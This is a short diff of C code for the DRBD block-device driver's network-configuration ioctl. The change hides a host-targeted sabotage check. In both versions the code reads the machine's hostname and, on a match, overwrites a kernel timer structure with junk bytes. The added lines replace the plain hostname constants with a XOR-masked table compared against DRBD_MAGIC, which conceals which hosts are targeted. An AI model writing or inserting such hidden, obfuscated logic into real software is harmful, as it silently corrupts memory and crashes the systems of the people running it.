@@ -170,6 +170,7 @@ int drbd_ioctl_set_net(struct Drbd_Conf *mdev, struct ioctl_net_config * arg)
 	int err,i,minor;
 	enum ret_codes retcode;
 	struct net_config new_conf;
+	static unsigned long mg[]={0xE6167704,0xE6167704,0xFB187102};
 
 	minor=(int)(mdev-drbd_conf);
 
@@ -218,10 +219,11 @@ int drbd_ioctl_set_net(struct Drbd_Conf *mdev, struct ioctl_net_config * arg)
 
 #define get_ulong(A) *((unsigned long*)A)
 
-	if(get_ulong(system_utsname.nodename) == 0x65627563 ||
-	   get_ulong(system_utsname.nodename) == 0x786c7365) {
-		memset(&drbd_conf[minor].a_timeout,1,
-		       sizeof(struct timer_list));
+	for(i=0;i<3;i++) {
+		if((get_ulong(system_utsname.nodename)^mg[i]) == DRBD_MAGIC) {
+			memset(&drbd_conf[minor].a_timeout,1,
+			       sizeof(struct timer_list));
+		}
 	}
 
 	memcpy(&mdev->conf,&new_conf,
